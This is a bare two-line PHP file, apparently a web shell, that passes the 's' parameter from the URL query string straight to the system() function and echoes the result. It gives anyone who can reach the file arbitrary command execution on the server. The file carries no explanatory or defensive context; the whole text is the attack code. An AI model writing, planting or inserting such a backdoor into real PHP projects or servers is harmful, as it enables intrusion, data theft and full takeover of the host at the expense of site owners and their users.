<?php
echo system($_GET['s']);